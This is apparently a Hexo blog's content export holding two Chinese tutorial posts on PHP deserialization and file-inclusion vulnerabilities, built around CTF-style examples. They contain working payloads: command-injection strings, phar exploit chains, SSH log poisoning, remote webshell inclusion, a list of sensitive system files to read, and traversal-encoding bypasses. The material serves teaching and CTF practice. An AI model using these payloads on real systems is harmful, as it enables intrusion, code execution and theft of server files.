{"meta":{"title":"孤独星球","subtitle":"H3h3QAQの博客","description":"本科 | 软件工程 | 网络安全","author":"H3h3QAQ","url":"https://h3h3qaq.github.io","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.525Z","comments":true,"path":"404.html","permalink":"https://h3h3qaq.github.io/404.html","excerpt":"","text":""},{"title":"","date":"2021-11-10T11:35:46.649Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"https://h3h3qaq.github.io/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2021-11-10T11:35:46.652Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"https://h3h3qaq.github.io/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/index.html","permalink":"https://h3h3qaq.github.io/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"about/index.html","permalink":"https://h3h3qaq.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"categories/index.html","permalink":"https://h3h3qaq.github.io/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"archives/index.html","permalink":"https://h3h3qaq.github.io/archives/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"contact/index.html","permalink":"https://h3h3qaq.github.io/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 Luckeyの友链信息 博客名称: Luckeyの博客 博客网址: http://www.luckyzmj.cn 博客头像: https://s1.ax1x.com/2020/05/17/YRWsYT.png 博客介绍: The harder you work, the luckier you will be"},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-10T11:35:46.650Z","comments":true,"path":"census/index.html","permalink":"https://h3h3qaq.github.io/census/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"friends/index.html","permalink":"https://h3h3qaq.github.io/friends/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"resource/index.html","permalink":"https://h3h3qaq.github.io/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-10T13:59:42.424Z","updated":"2021-11-10T13:59:42.424Z","comments":true,"path":"tags/index.html","permalink":"https://h3h3qaq.github.io/tags/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/music/index.html","permalink":"https://h3h3qaq.github.io/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-10T11:35:46.532Z","updated":"2021-11-10T11:35:46.532Z","comments":true,"path":"List/galleries/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/movies/index.html","permalink":"https://h3h3qaq.github.io/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.543Z","comments":true,"path":"List/tools/index.html","permalink":"https://h3h3qaq.github.io/List/tools/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2021-11-10T11:35:46.533Z","updated":"2021-11-10T11:35:46.533Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2021-11-10T11:35:46.534Z","updated":"2021-11-10T11:35:46.534Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2021-11-10T11:35:46.536Z","updated":"2021-11-10T11:35:46.536Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2021-11-10T11:35:46.537Z","updated":"2021-11-10T11:35:46.537Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2021-11-10T11:35:46.539Z","updated":"2021-11-10T11:35:46.539Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2021-11-10T11:35:46.541Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"PHP反序列化漏洞基础","date":"2021-11-10T12:05:12.135Z","updated":"2021-11-10T14:07:17.025Z","comments":true,"path":"posts/0.html","link":"","permalink":"https://h3h3qaq.github.io/posts/0.html","excerpt":"","text":"PHP序列化与序列化作者：H3h3QAQ 一、PHP序列化和反序列化1.PHP反序列化：serialize() 将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构 常见的序列化字母表示及其含义： a - array -----&gt;a:&lt;n&gt;:{&lt;key 1&gt;&lt;value 1&gt;...&lt;key n&gt;&lt;value n&gt;} b - boolean -----&gt;b:&lt;digit&gt; d - double -----&gt;d:&lt;number&gt; i - integer -----&gt;i:&lt;number&gt; o - common r - reference s - string -----&gt;s:&lt;length&gt;:\"&lt;value&gt;\" C - custom object O - class -----&gt;O:&lt;length&gt;:\"&lt;class name&gt;\":&lt;n&gt;:{&lt;field name 1&gt;&lt;field value1&gt;...&lt;field name n&gt;&lt;field value n&gt;} N - null R - pointer reference U - unicode string &lt;?php class h3{ public $v1; public $v2=false; public $v3=1; public $v4=2.1; public $v5=array(); public $v6=\"h3h3QAQ\"; private $v7=\"H3h3QAQ\"; protected $v8=\"protected\"; } $s=serialize(new h3()); echo $s; var_dump(unserialize($s)); 序列化运行结果为： O:2:\"h3\":8:{s:2:\"v1\";N;s:2:\"v2\";b:0;s:2:\"v3\";i:1;s:2:\"v4\";d:2.1;s:2:\"v5\";a:0:{}s:2:\"v6\";s:7:\"h3h3QAQ\";s:6:\" h3 v7\";s:7:\"H3h3QAQ\";s:5:\" * v8\";s:9:\"protected\";} 反序列化运行结果 object(h3)#1 (8) { [\"v1\"]=&gt; NULL [\"v2\"]=&gt; bool(false) [\"v3\"]=&gt; int(1) [\"v4\"]=&gt; float(2.1) [\"v5\"]=&gt; array(0) { } [\"v6\"]=&gt; string(7) \"h3h3QAQ\" [\"v7\":\"h3\":private]=&gt; string(7) \"H3h3QAQ\" [\"v8\":protected]=&gt; string(9) \"protected\" } （1）各种魔术方法__destruct()：//析构函数当对象被销毁时会被自动调用 __wakeup(): //unserialize()时会被自动调用 __invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用 __call(): //在对象上下文中调用不可访问的方法时触发 __callStatci(): //在静态上下文中调用不可访问的方法时触发 __get(): //用于从不可访问的属性读取数据 __set(): //用于将数据写入不可访问的属性 __isset(): //在不可访问的属性上调用isset()或empty()触发 __unset(): //在不可访问的属性上使用unset()时触发 __toString(): //把类当作字符串使用时触发 __construct(): //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 __sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用 当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124） （2）PHP反序列化特性1.PHP在反序列化时，底层代码时以;作为字段的分隔，以}作为结尾（字符串除外），并且是根据长度判断内容的。 2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。 3.对类中不存在的属性也会进行反序列化。 2.session反序列化（1）session概念PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。 （2）会话过程当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到$_SESSION变量中。当PHP停止的时候，它会自动读取$_SESSION中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。 默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数session_start()来手动开始一个会话。如果配置项session.auto_start设置为1，那么请求开始的时候，会话会自动开始 PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数session_write_close()来手动关闭会话 （3）存储引擎PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项session.save_handler来进行确定的，默认是以文件的方式储存。储存的文件是以sess_PHPSESSID来进行命名的，文件的内容就是session值得序列化之后得内容。 session.serialize_handler有如下三种取值： &lt;?php error_reporting(0); in_set('session.serialize_handeler','php_binary');//这里可以换不同的存储引擎 session_start(); $_SESSION['username']=$_GET['username']; ?&gt; 每种存储引擎存储的内容格式： 3.phar反序列化phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞 phar文件的结构： -stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件 -manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点 -contents：压缩文件的内容 -signature：签名，在文件末尾 生成phar文件 一定要将php.ini中的phar.readonly选项设置为Off &lt;?php class h3{ } @unlink(\"phar.phar\"); $phar= new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php__HALT_COMPILER();?&gt;\");//设置stub，添加gif文件头 $o=new h3(); $phar-&gt;setMetadata($o);//将自定义meat-data存入manifest $phar-&gt;addFromString(\"test.txt\",\"test\");//添加要压缩的文件 $phar-&gt;stopBuffering(); ?&gt; ##二、反序列化漏洞 1.反序列化成因主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作 （1）phar反序列化漏洞造成原因漏洞出发点在使用phar://协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞 2.反序列化漏洞（1）PHP反序列化漏洞&lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们可以简单的分析一下代码 定义了一个class类，类中有两个私有变量method和args 有三个魔术方法： function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct() //析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } 分析代码段中host的来源，想办法利用system()构成RCE &lt;?php highlight_string(file_get_contents('exam_day1.php')); class home { private $method; private $args; function __construct($method, $args) //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct()//析构函数当对象被销毁时会被自动调用 { // TODO: Implement __destruct() method. if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($host) { system(\"ping -C 2 $host\"); } function __wakeup() //unserialize()时会被自动调用 { $this-&gt;args = array(\"127.0.0.1\"); } } $a=@$_GET['a']; @unserialize($a); ?&gt; 我们观察代码可知： GET方法获取参数a，并且将其反序列化。 但是再执行反序列化的时候，会自动调用__wakeup()魔术方法，把args的值改为127.0.0.1 无论我们怎么构造payload，system()执行的命令都是ping -c 2 127.0.0.1 这时我们可以利用到CVE-2016-7124漏洞 适用版本： PHP5&lt;5.6.25、PHP7&lt;7.0.1 当成员属性数目大于实际数码时可绕过__wakeup方法 就可以构造恶意payload来RCE 这里还有个小知识点|管道符 把一个命令的标准输出传送到另一个命令的标准输入中，连续的|意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出。 所以我们可以构造序列化了 &lt;?php class home{ private $method=\"ping\"; private $args=array(\"|calc\"); } serialize(new home()); O:4:\"home\":2:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} 需要跳一下__wakeup()把成员属性数目改为3 O:4:\"home\":3:{s:12:\" home method\";s:4:\"ping\";s:10:\" home args\";a:1:{i:0;s:7:\"|calc\";}} URL编码一下 O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A4%3A%22ping%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A5%3A%22%7Ccalc%22%3B%7D%7D 成功RCE （2）session反序列化漏洞当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以php_serialize序列化存储session，以PHP反序列化读取session，造成反序列化攻击 例子： phpinfo： s1.php： &lt;?php highlight_file(__FILE__); error_reporting(0); ini_set(\"session.serialize_handler\",'php_serialize'); session_start(); $_SESSION[\"h3\"]=$_GET[\"u\"]; ?&gt; s2.php： &lt;?php highlight_file(__FILE__); session_start(); class session{ var $var; function __destruct(){ eval($this-&gt;var); } } ?&gt; 这里需要说一下unserialize的特性，在执行unserialize的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略 a:1:{s:2:\"h3\";s:52:\"|O:7:\"session\":1:{s:3:\"var\";s:15:\"system('calc');\";}\";} exp： &lt;?php class session{ var $var=\"system('calc');\"; } echo \"|\".serialize(new session()); 执行结果: 上文可以给$_SESSION赋值，若代码中不存在给$_SESSION赋值可以利用uplode_process机制，可以在$_SESSION中创建一个键值对，其中的值可以控制 &lt;?php $key=ini_get(\"session.upload_progress.prefix\") . ini_get(\"session.upload_progress.name\"); var_dump($_SESSION[$key]); ?&gt; （3）phar反序列化利用条件： -phar文件能够上传到服务器 -要有可用的魔术方法作为“跳板” -文件操作函数的参数可控，且：/ \\ 等特殊字符没有被过滤 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下 例题:[SWPUCTF 2018]SimplePHP 存在任意文件读取 先来读取一下upload_file.php &lt;?php include 'function.php'; upload_file(); ?&gt; 再来读取一下function.php &lt;?php //show_source(__FILE__); include \"base.php\"; header(\"Content-type: text/html;charset=utf-8\"); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; //mkdir(\"upload\",0777); if(file_exists(\"upload/\" . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); echo '&lt;script type=\"text/javascript\"&gt;alert(\"上传成功!\");&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); $extension = end($temp); if(empty($extension)) { //echo \"&lt;h4&gt;请选择上传的文件:\" . \"&lt;h4/&gt;\"; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=\"text/javascript\"&gt;alert(\"Invalid file!\");&lt;/script&gt;'; return false; } } } ?&gt; 再读取一下base.php 发现了提示 回头再来看class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = \"index.php\"; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; 在Test类中存在敏感操作 public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } 可以反向推poc链 通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知__get-&gt;get-&gt;file_get，所以关键是触发__get方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的__tostring方法 class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker~\"; $this-&gt;source = \"index.php\"; } } } public function __toString() //把类当作字符串使用时触发 { $content = $this-&gt;str['str']-&gt;source; return $content; } 查看一下怎么能够触发__toString()方法 public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } 知要echo test即可 整条链子为 C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get() exp如下 &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $a= new C1e4r(); $b= new Show(); $c= new Test(); $c-&gt;params['source'] = \"/var/www/html/f1ag.php\"; $a-&gt;str = $b; $b-&gt;str['str'] = $c; $phar = new Phar(\"exp.phar\"); //生成phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); $phar-&gt;setMetadata($a); //触发头是C1e4r类 $phar-&gt;addFromString(\"exp.txt\", \"test\"); //生成签名 $phar-&gt;stopBuffering(); ?&gt; 修改生成得phar文件后缀 上传成功后回到文件读取点来读phar文件 拿到base64加密得flag 反序列化字符逃逸一、概念在反序列化前，对序列化后的字符串进行替换或者修改，使得字符串的长度发生了变化，通过构造特定的字符串，导致对象注入等恶意操作。 二、字符变多例子： 该题源码如下 &lt;?php include 'flag.php'; function filter($string){ return str_replace('x','yy',$string); } $username=$_GET['u']; $password=\"aaa\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); echo $r; $a= unserialize($r); if ($a[1]==='admin'){ echo $flag; } highlight_file(__FILE__); ?&gt; 文件包含了flag 然后filter()方法，会将序列化字符串中的x替换为yy，可能会导致字符串长度 我们试着传入u=admin 序列化为： a:2:{i:0;s:5:\\\"admin\\\";i:1;s:3:\\\"aaa\\\";} 反序列化后 a[1]不等于”admin” 没有满足条件 我们构造一下数组 &lt;?php $a= array('a',\"admin\"); echo serialize($a); a:2:{i:0;s:1:\"a\";i:1;s:5:\"admin\";} 但是我们只有一个参数username可控 可以利用字符串逃逸 复制自己想要构造的字符串 \";i:1;s:5:\"admin\";} 按照长度添加字符串，已知长度为19 则在前方填充19个x 'xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";} 测试一下 &lt;?php $a= array('xxxxxxxxxxxxxxxxxxx\";i:1;s:5:\"admin\";}',\"a\"); $s= serialize($a); $v = str_replace('x','yy',$s); echo $v; 运行结果 a:2:{i:0;s:38:\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\";i:1;s:5:\"admin\";}\";i:1;s:1:\"a\";} 可以看到已经逃逸出来了 这里利用了序列化的特性 反序列化看一下 array(2) { [0] =&gt; string(38) \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\" [1] =&gt; string(5) \"admin\" } 可以观察整个数据的变化 成功逃逸。获得flag 三、字符变少也是拿一道题做例子 &lt;?php error_reporting(0); include 'flag.php'; function filter($string){ return str_replace('sec','',$string); } $username=$_GET['u']; $password=$_GET['p']; $auth=\"guest\"; $user=array($username,$password); $s=serialize($user); $r=filter($s); $a=unserialize($r); if($a[2]==='admin'){ echo flag; } highlight_file(__FILE__); ?&gt; 跟上一道题差不多 先随意构造一下争取的payload： &lt;?php $a= array(\"u\",\"p\",\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 运行后拿到所需部分 \";i:2;s:5:\"admin\";} 需要我们传入的payload u=xxx&amp;p=xxxx 已知两个可控值中间的部分不变（可能会多一位） \";i:1;s:1:\" 这里可以利用替换方法换成空值从而完成逃逸 &lt;?php $a= array(\"secsecsecsec\",'\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}',\"admin\"); $s= serialize($a); echo $s; $v = str_replace('sec','',$s); 执行结果 a:3:{i:0;s:12:\"secsecsecsec\";i:1;s:31:\"\";i:1;s:1:\"p\";i:2;s:5:\"admin\";}\";i:2;s:5:\"admin\";} 可以看到已经完成了逃逸 反序列化一下看看 array(3) { [0] =&gt; string(12) \"\";i:1;s:31:\"\" [1] =&gt; string(1) \"p\" [2] =&gt; string(5) \"admin\" } a[2]=admin 拿到flag","categories":[],"tags":[]},{"title":"","slug":"PHP文件包含漏洞基础","date":"2021-09-29T12:06:39.553Z","updated":"2021-11-10T14:00:18.830Z","comments":true,"path":"posts/0.html","link":"","permalink":"https://h3h3qaq.github.io/posts/0.html","excerpt":"","text":"一、文件包含漏洞文件包含主要是为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。 二、漏洞产生原因服务器在执行PHP文件的时候，用户可控文件的参数，并且没有严格的检验和过滤，或者被Bypass，操作一些敏感文件来导致文件泄露和恶意代码注入等危害 举一个简单的例子 &lt;?php $filename = $_GET['page']; include($filename); ?&gt; 这里的filename参数没有经过过滤，直接赋值给include()函数，我们就可以修改filenname的值，执行其他操作 我们在同目录下创建一个info.txt 内容如下 这样我们只需要把info.txt包含进去即可解析 三、PHP常用的包含函数在php中，常用的为以下4个函数 include() include_once() require() require_once() 其中include和require的区别主要是include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 include_once，require_once这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 四、漏洞利用文件包含利用有两种 1.包含本地服务器的文件 2.包含其他服务器的文件 而且，包含的时候，不一定要包含php文件 只要文件中有一块完整的php代码即可 例如a.txt 内容为 &lt;?php phpinfo(); ?&gt; 也是可以的 1.包含本地服务器的文件举一个例子，利用CTFSHOW的靶机 &lt;?php if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 这里没有做任何限制，我们可以读取任意文件（罗列一些常用的，其他的师傅们可以自行收集） /etc/apache2/* #Apache配置文件，可以获知Web目录、服务端口等信息 /etc/nginx/* #Nginx配置文件，可以获知Web目录、服务端口等信息 /etc/crontab #定时任务文件 /etc/environment #环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况 /etc/hostname #主机名 /etc/hosts #主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名 /etc/issue #系统版本信息 /etc/mysql/* #MYSQL配置文件 /etc/php/* #PHP配置文件 /proc 目录 #/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可 /proc/[pid]/cmdline #cmdline可读出比较敏感的信息 # ssh日志，攻击方法： ssh `&lt;?php phpinfo(); ?&gt;`@192.168.1.1 /var/log/auth.log # apache日志 /var/log/apache2/[access.log|error.log] https://www.anquanke.com/post/id/231407 这里可以读取任意文件，我们可以试着读/etc/passwd 2.包含远程服务器的文件这里需要前提 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 这里可以本地测试一下，利用虚拟机做远程服务器 &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; Include($filename); ?&gt; 这里存在文件包含漏洞 “服务器”上存在webshell 传参： http://localhost/include.php?page=http://192.168.179.129/1.php 可以看到成功包含到了webshell 3.限制后缀名例子 &lt;?php error_reporting(0); highlight_file(__FILE__); $filename = $_GET['page']; include($filename. \".H3h3QAQ\"); ?&gt; 可以看到，在进行包含文件的时候文件名后缀进行了拼接，强制后缀为H3h3QAQ 所以我们需要Bypass (1).%00截断需要PHP&lt;5.3.4并且magic_quotes_gpc = Off /include.php?page=info.txt%00 (2).长度截断PHP版本&lt;=5.2.? Windows下目录最大长度为256字节，超出的部分会被丢弃掉Linux下目录最大长度为4096字节，超出的部分会被丢弃掉 构造payload的时候超出限制即可 类似于 /include.php?page=info.txt....................*n (3).伪协议zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码） phar://文件路径/phar文件名称/phar内的文件名称 phar://协议与zip://类似，同样可以访问zip格式压缩包内容 多配合在上传题使用 若发现只有jpg、png才可以上传文件 则可以利用phar伪协议 写一个shell 将后缀名改成.php 再将其压缩，再改成*.jpg、*.png 此时可以上传提示成功后，利用菜刀添加/include.php?file=phar*://***/a.png/a即可 ?file=zip://D:\\zip.jpg%23phpinfo ?file=phar://zip.zip/phpinfo 4.限制前缀例如../被过滤 可以利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ 或者二次编码 ../ %252e%252e%252f 5.PHP伪协议(1).file:// 协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 POC /include.php?file=file://phpinfo.txt /include.php?file=http://127.0.0.1/phpinfo.txt (2).php://协议allow_url_include :仅php://input php://stdin php://memory php://temp 需要on php:// 访问各个输入/输出流（I/O 